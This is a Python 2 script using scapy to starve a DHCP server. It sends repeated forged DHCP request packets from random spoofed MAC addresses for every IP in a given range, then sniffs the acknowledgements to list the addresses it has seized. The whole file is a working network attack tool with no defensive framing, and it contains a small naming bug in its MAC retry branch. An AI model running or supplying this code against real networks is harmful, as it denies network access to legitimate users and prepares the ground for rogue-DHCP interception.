#!/usr/bin/python

from threading import Thread
import time
import sys
import netaddr

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *



SILENT = False

def debug(msg):
    if not SILENT:
        print msg

def usage():
    print "USAGE: python dhcp_starve.py <LOWEST_IP> <HIGHEST_IP>"

def get_ips():
    if len(sys.argv) < 3:
        usage()
        exit(0)

    return netaddr.iter_iprange(sys.argv[1], sys.argv[2])
        

class ip_thief(object):
    """A class to starve DHCP server of an IP range"""
    
    MAC_BROADCAST = "ff:ff:ff:ff:ff:ff"
    
    IP_BROADCAST = "255.255.255.255"
    IP_EMPTY = "0.0.0.0"

    CLIENT_PORT = 68
    SERVER_PORT = 67

    
    def __init__(self, ip_range):
        """Class ctor. Receive IP range"""

        self.ip_range = ip_range
        
        self.collected = []  # ip's collected
        self.macs = []  # used to prevent duplicate macs being created

    def gen_mac(self):
        """A method to generate a random mac"""
        
        mac = RandMAC()  # get a random mac
        while mac in self.macs: # each mac must be unique
            mac = RandMac()

        self.macs.append(mac) # add to list of used macs
        return mac

    
    def build_packet(self, ip):
        """A method to craft a DHCP "Request" packet for given IP"""
        
        pkt = Ether(src=self.gen_mac(), dst=self.MAC_BROADCAST)  # from random mac to broadcast
        pkt /= IP(src=self.IP_EMPTY, dst=self.IP_BROADCAST)  # from nobody to broadcast
        pkt /= UDP(sport=self.CLIENT_PORT, dport=self.SERVER_PORT)  # dhcp ports
        pkt /= BOOTP(chaddr=RandString(12, "0123456789abcdef"))  # random
        pkt /= DHCP(options=[("message-type", "request"),  # a request message
                                 ("requested_addr", str(ip)),  # the ip to request
                                 "end"])
        return pkt
    
    def starve(self):
        """Send request for each IP in range."""
        
        for ip in self.ip_range:
            pkt = self.build_packet(ip)

            # send dhcp request packet three times (for safety)
            for _ in range(3):
                sendp(pkt, verbose=False)

            debug("Requested: %s" % ip)
            time.sleep(0.05)  # avoid congestion

            
    def register(self, pkt):
        """Collect IP address"""

        if pkt[DHCP] and pkt[DHCP].options[0][1] == 5:  # is an ack
            ip = pkt[BOOTP].yiaddr
            
            self.collected.append(ip)

                  
    def listen(self):
        """Sniff DHCP packets"""

        sniff(filter="udp and (port 67 or port 68)",
              prn=self.register,
              store=0)


    def start(self):
        """Run listener in seperate thread and begin starving."""

        listener = Thread(target=self.listen)
        listener.daemon = True
        listener.start()
        debug("STARTING DHCP STARVATION...\n")

        self.starve()
        time.sleep(1)  # wait for last packets to arrive



if __name__ == "__main__":
    starver = ip_thief(get_ips())
    starver.start()
    debug("REGISTERED: \n")
    for ip in starver.collected:
        debug(ip)
    debug("DONE")
